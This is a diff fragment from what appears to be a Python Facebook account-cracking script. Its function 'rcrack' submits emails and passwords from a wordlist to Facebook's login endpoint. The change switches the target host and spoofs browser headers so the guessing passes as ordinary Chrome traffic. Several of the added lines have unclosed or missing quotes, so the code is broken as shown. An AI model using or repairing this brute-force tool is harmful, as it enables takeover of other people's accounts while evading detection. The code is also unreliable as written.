@@ -852,17 +852,17 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'https://mbasic.facebook.com/',
+			header_freefb = {'authority':'https://graph.facebook.com/',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
+			'accept-encoding':'gzip, deflate, br
+			'cache-control': max-age=0 
+			'sec-ch-ua': '" "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111",
+			'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',
 			'sec-fetch-dest': 'document',
 			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
+			'sec-fetch-site': 'cross-site',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
